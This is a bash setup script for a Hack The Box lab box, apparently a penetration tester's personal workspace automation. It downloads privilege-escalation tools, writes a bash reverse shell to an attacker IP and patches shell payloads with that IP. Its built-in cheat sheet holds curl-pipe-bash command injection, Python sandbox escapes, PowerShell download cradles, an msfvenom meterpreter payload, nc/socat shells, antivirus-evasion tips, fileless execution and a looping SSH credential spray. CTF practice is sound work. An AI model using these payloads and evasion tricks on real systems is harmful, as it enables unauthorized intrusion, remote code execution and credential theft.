#!/bin/bash
# to run type '. /directory/setup'
# set box name, IP and ostype
#for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done

# Ensure IP argument is passed
if [[ -z "$1" ]]; then
    echo "Usage: . $0 /opt/Script/setup <target_ip>"
    return 1
fi

BOXNAME=CodeTwo
OS=lin
USER=bob
TUNINDEX=3

IP=$1
HOME="/home/$USER/hackthebox/$BOXNAME"
SELF="$(hostname -I | awk '{print $'$TUNINDEX'}')"
HTB_TOKEN="$(cat /opt/Scripts/.HTB_TOKEN)"

export IP
export HOME
export SELF
export HTB_TOKEN
export BOXNAME

#start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
#and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
# the current working vault =
#/opt/obsidian/Obsidian-0.11.5.AppImage &>/dev/null &

#read 'Press [Enter] key if this is first run'
#read 'Are you sure this is the first run?'
## Bash add pause prompt for 5 seconds ##
#read -t 5 'I am going to wait for 5 seconds only ...'

#only run if first time or will lose all work
mkdir "$HOME"
mkdir "$HOME/nmap"
mkdir "$HOME/buster"
mkdir "$HOME/www"
mkdir "$HOME/$BOXNAME"
touch "$HOME/notes"
touch "$HOME/.hushlogin"

# copy windows specif scripts to windows box or linux specific to linux box
cp /opt/Scripts/auto_stabilize_shell.sh "$HOME/"
cp /opt/Scripts/.bashrc "$HOME/"
cp /opt/Scripts/.bash_aliases "$HOME/"
cp /opt/Scripts/.tmux.conf "$HOME/"
cp /opt/Scripts/.zshrc "$HOME/"

if [[ "$OS" == 'win' ]]; then

    #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o $HOME/www/winPEASany.exe
    #curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -o $HOME/www/winPEAS.bat
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASx64.exe -o "$HOME/www/winpeasx64.exe"
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/download/20220930/winPEASany.exe -o "$HOME/www/winpeasany.exe"
    #curl -s -L https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip -o "$HOME/www/"
    # unzip $HOME/www/ConPtyShell.zip -d $HOME/www/
    #curl -s -L https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip -o $HOME/www/
    # unzip $HOME/www/RunasCs.zip -d $HOME/www/
    #curl -s -L https://github.com/Friends-Security/SharpExclusionFinder/releases/download/v1/SharpExclusionFinder.exe -o $HOME/www/
    #cp /opt/PEASS-ng/winPEAS/winPEASexe/binaries/Release/winPEASany.exe $HOME/www
    #cp /opt/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat $HOME/www
    #cp /usr/share/windows-resources/binaries/netcat32/netcat-1.11/nc64.exe $HOME/www
    cp /usr/share/windows-resources/binaries/nc.exe "$HOME/www"
    cp /opt/ConPtyShell/Invoke-ConPtyShell.ps1  "$HOME/www"
    echo "Invoke-ConPtyShell $SELF 9001" >> "$HOME/www/Invoke-ConPtyShell.ps1"
    cp /opt/ConPtyShell/ConPtyShell.exe "$HOME/www"
    cp /opt/ConPtyShell/ConPtyShell.cs "$HOME/www"
    cp /opt/RunasCs/RunasCs.exe "$HOME/www"
    cp /opt/SharpExclusionFinder/SharpExclusionFinder.exe "$HOME/www"
    cp /opt/Scripts/shell.c "$HOME/www"
    cp /opt/Scripts/root.c "$HOME/www"
    cp /opt/Scripts/sslshell.ps1 "$HOME/www"
    cp /opt/Scripts/put_server1.py "$HOME/www"
else
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o "$HOME/www/linpeas.sh"
    curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o "$HOME/www/linpeas_linux_amd64"
    #cp /opt/PEASS-ng/linPEAS/linpeas.sh $HOME/www/
    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o "$HOME/www/pspy64s"
    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o "$HOME/www/pspy64"
    cp /opt/Scripts/shell.c "$HOME/www"
    cp /opt/Scripts/root.c "$HOME/www"
    cp /opt/Scripts/sslshell.ps1 "$HOME/www"

fi
echo -ne "#!/bin/bash\nbash -i >& /dev/tcp/$SELF/9001 0>&1" >> "$HOME/www/shell.sh"
chmod +x "$HOME/www/*"
sed -i "s/REPLACE_THIS_COMMAND/curl http:\/\/$SELF\/code.bin/g" "$HOME/www/shell.c"
sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/shell.c"
sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/shell.c"
sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/sslshell.ps1"
sed -i 's/REPLACE_THIS_PORT/9001/g' "$HOME/www/sslshell.ps1"
sed -i "s/REPLACE_THIS_IP/$SELF/g" "$HOME/www/root.c"

# Build notes
cat << 'EOF' >> "$HOME/notes"
# Standard enumration
export IP='$IP' > $HOME/notes
masscan -p1-65535,U:1-65535 $IP --rate=1000 -e tun0
nmap -sC -sV -p- -vvv -oN $HOME/nmap/Initial $IP
gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -s 200 -x php,html,txt,xml,sh,py -o buster/80dir.log
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o buster/root.log
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log
gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log
gobuster dns domain.com -o buster/dom.log

# curl
don't do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do:
curl http://$IP/cmd.php --data-urlencode 'cmd=curl http://$SELF/shell.sh|bash'
svn export https://github.com/repo.git/trunk/<folder to download>
echo -n '+'|jq -Rr @uri

# Python3 Sandbox Bypasses
getattr(getattr(globals()['__snitliub__'[::-1]], '__tropmi__'[::-1])('so'[::-1]),'metsys'[::-1])('ls')
[x for x in [].__class__.__base__.__subclasses__() if x.__name__.lower() == 'p' + 'op' + 'en'][0](['curl','http://$IP/shell.sh','|','bash'])

# tmux
if wanting to use another environmemnt in tmux and have multiple servers running
first start a new socket then call the socket with -S and attache to the socket
tmux -L Boxname
tmux -S /tmp/tmux-1000/Boxname ls
tmux -S /tmp/tmux-1000/Boxname a -t 0
tmux show-environment [-g] [-t target-session] || tmux set-environment [-gru] [-t target-session] name [value]
tmux show-environment -t 0 || tmux set-environment -t 0 IP 127.0.0.1 || and have to start new windows

# nikto
nikto -h $IP
add machine name domain.htb to /etc/hosts (search to ensure named correct)
nikto -h domain.htb

# To fix copy and paste problems in Virtual box
# when in virtual Machine
any problems kill VBoxClient clipboard etc.

# Windows Shells
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"
IWR http://10.10.10.10/shell.exe -OutFile shell.exe
klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88

# usefull windows tricks
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.124 LPORT=9001 -f exe -o shell.exe
Get-CimInstance -Query "select * from win32_service where Started=True"|fl Name,PathName,Started,StartName
Expand-Archive xyz.zip
Start-Job -FilePath C:\Scripts\Sample.ps1
Invoke-Command -Computer dc01 -ScriptBlock { C:\blah.exe } -asJob
Invoke-Command -scriptblock { script }  -asJob -computername localhost
Start-Job -scriptblock { script }
Start-Process powershell {script}
Get-Process <name>
Stop-Process <pid>

# fix encoding problems
iconv -f utf-16le -t utf-8 lin.log -o lin2.log
gc rev.bat|set-content rev2.bat -encoding ascii
dos2unix file && vim --clean file

# Create and read QRCodes
qrencode -o output.png -s 10 'mymessage'
zbarimg output.png

# Windows privesc checklist
https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

# linux privesc checklist
https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist


# CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)
# For local

# For Local
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"
see basic powershell in hacktricks for more

# runascs
runascs.ps1 is great for executing as another user if all else fails..
Invoke-RunasCs -Username user1 -Password password1 -Command powershell.exe (or cmd.exe) -Remote 10.10.14.129:9001

# really cool way to pivot/scan with nc
mkfifo reply
nc -klvnp 65535 < reply | nc 127.0.0.1 6739 > reply
(nc -klvnp <port to use> < reply | nc 127.0.0.1 <port interested in scanning etc> > reply)
(dont forget to rm reply)
Then can just scan port 6379 through 65535 etc.
to scan ports with busybox/nc nc -z -v -w 1 192.168.0.1 80

# More ways to pivot
9510 and other ports through chisel
# On Kali
kali@kali:~$ ./chisel server -p 9002 --reverse
# On Windows
./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512
# if using metasploit
portfwd add -l 9510 -p 9510 -r 10.10.11.115

# Relay Binaries
socat TCP4-LISTEN:4444,fork EXEC:/bin/bash
socat tcp-listen:7777,reuseaddr,fork exec:cat,nofork
socat tcp-l:9999,reuseaddr,fork EXEC:./leak
socat -U TCP-LISTEN:5403,fork EXEC:'/usr/bin/data',stderr,pty,echo=0
socat tcp-l:5000,reuseaddr,fork EXEC:"./vuln",pty,stderr
ncat -l 1234 -c '/usr/bin/data' --keep-open
nc -lvnp 9999 -e '/usr/local/bin'

## create named pipe
rm -f /tmp/f; mkfifo /tmp/f

## launch interactive 'sh' session redirected to/from listening nc
cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f
from another terminal connect

# Static Binaries
https://github.com/andrew-d/static-binaries
https://github.com/polaco1782/linux-static-binaries

# Windows Sharp Binaries
check this out - git clone https://github.com/Flangvik/SharpCollection.git for windows sharp binaries

# Run Obsidian
/opt/obsidian/Obsidian-0.15.9.AppImage &>/dev/null &

# Anti Virus Evasion
## Nishang
for nishang antivirus evasion, just replace the Invoke-PowershellTcp with anything
and replace sendback with anything, and it should replace sendback and sendback2
and for the oneliner, split it to individual lines after every semicolon (;) , or just at after the {0};
## Conptyshell
for conpty shell replace the name invoke-conptyshell and conptyshell and remove the how to use section

# [defender exclusions](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/)
Get-MPPreference | select-object ExclusionPath
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*exclusion\Path*" } | Select-Object Message | FL
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\folder_to_check\|*"
https://medium.com/@lsecqt/creating-fully-undetectable-payload-fud-with-c-46a734837d1c
https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/

# Fileless elf execution
curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al

# Docker commands
# enter docker image
sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app
# enter docker container
sudo docker exec -it container bash

# OverlayFS and GameOverlay
https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/
https://github.com/briskets/CVE-2021-3493

# LFI and Directory Traversal
# ../../etc/passwd (dots and filenames)
directory traversal/intruder
  directory_traversal.txt:140
  dotdotpwn.txt:21144
File Inclusion/Intruders
  Traversal.txt:4521
# ../../{FILES} (:%s/{FILES}//g --> page=FUZZ1FUZZ2 -w deep_traversal.txt:FUZZ1 -w list2:FUZZ2)
directory traversal/intruder
  deep_traversal.txt:878
  traversals-8-deep-exotic-encodings.txt:887
# /etc/passwd (just files to search for not dots)
file inclusion/intruders
  BSD-files.txt:12
  LFI-FD-check.txt:38
  LFI-WindowsFileCheck.txt:69
  Linux-files.txt:61
  List_Of_File_To_Include_NullByteAdded.txt:318
  List_Of_File_To_Include.txt:911
  Mac-files.txt:7
  simple-check.txt:9
  Web-files.txt:13
  Windows-files.txt:212
# ../../ (just dots)
file inclusion/intruders
  dot-slash-PathTraversal_and_LFI_pairing.txt:885
# ../../ or ../../etc/passwd (both dots and just files and dots with files)
file inclusion/intruders
  JHADDIX_LFI.txt:879
EOF


# Build obsidian files for note keeping
# Cover page
cat << 'EOF' >> "$HOME/$BOXNAME/000 - Cover.md"
<p align="center">
  <img  width=1024 src="" />
</p>

# Path of Exploitation
* Foothold:
* User:
* root:
EOF

# loot page
cat << 'EOF' >> "$HOME/$BOXNAME/000 - Loot.md"
# Creds
| Username | Password | Description |
| --- | --- | -- |
| | | |
EOF

# Nmap page
cat << 'EOF' >> "$HOME/$BOXNAME/05 - Nmap.md"
# Nmap
| Port | Service | Description |
| --- | --- | --- |
| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
| 80 | http | |
| | | |

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
EOF

# Web enumeration page
cat << 'EOF' >> "$HOME/$BOXNAME/10 - Web Enumeration.md"
# Web Enumeration
EOF

# setup my tmux environment
#                                                       ________________
# window 0                                              |  %1  |  %2   |
# split vertical                                        |______|_______|
#                                                       |  %1  |  %2   |
# then split vertical                                   |______|_______|
cd || exit
tmux new-session -d
# stay in window zero
tmux split-window -v -d
tmux send-keys C-l 'nmapfull' Enter
# split h and stay in first window
tmux split-window -h -d
# send keys to the new split window
tmux send-keys -t %2 C-l 'cd www/;clear' Enter
tmux send-keys -t %2 C-l 'sudo python3 -m http.server 80' Enter
tmux split-window -h -t %1 -d
tmux send-keys -t %1 C-l 'nmapudp' Enter
# window 1
tmux new-window -d
tmux send-keys -t @1 C-l "cd $BOXNAME;nano '10 - Web Enumeration.md'" Enter
# window 2
tmux new-window -d
tmux send-keys -t @2 C-l "feroxbuster -u http://$IP -w  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --thorough"
# window 3
tmux new-window -d
tmux send-keys -t @3 C-l "ffuf -u http://$IP -H "Host: FUZZ.$BOXNAME.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc all"
# window 4
tmux new-window -d
tmux send-keys -t @4 C-l "/home/$USER/BurpSuiteCommunity/BurpSuiteCommunity" Enter
# window 5
tmux new-window -d
# Create a Vertical split
tmux split-window -t 5 -v -d
# We now have a top and bottom
# spit horizontal
tmux split-window -h -t 5.0 -d
# we now have tl tr b
# split tl
tmux split-window -v -t 5.0 -d
#we now have tl tr bl b
# split tr
tmux split-window -v -t 5.2 -d
# resize panes
tmux resize-pane -t 5.4 -D 20
tmux resize-pane -t 5.0 -U 7
tmux resize-pane -t 5.2 -U 7

# The layout should now be:
# +-------+-------+
# |       |       |
# |  0.0  |  0.2  |
# |       |       |
# +-------+-------+
# |       |       |
# |  0.1  |  0.3  |
# |       |       |
# +-------+-------+
# |      0.4      |
# +---------------+
#
# Now, send commands to each pane.
# C-l is Ctrl+l, which clears the screen.
# C-m is Enter
tmux send-keys -t 5.0 C-l 'nc -klvnp 65535 > userlist.txt' C-m
tmux send-keys -t 5.1 C-l 'nc localhost 65535' C-m
tmux send-keys -t 5.2 C-l 'nc -klvnp 65534 > passlist.txt' C-m
tmux send-keys -t 5.3 C-l 'nc localhost 65534' C-m
tmux send-keys -t 5.4 C-l "while true; do /opt/nxc ssh $IP -u userlist.txt -p passlist.txt; done" C-m

# Attach to the tmux session to view the panes.
tmux a -t 0
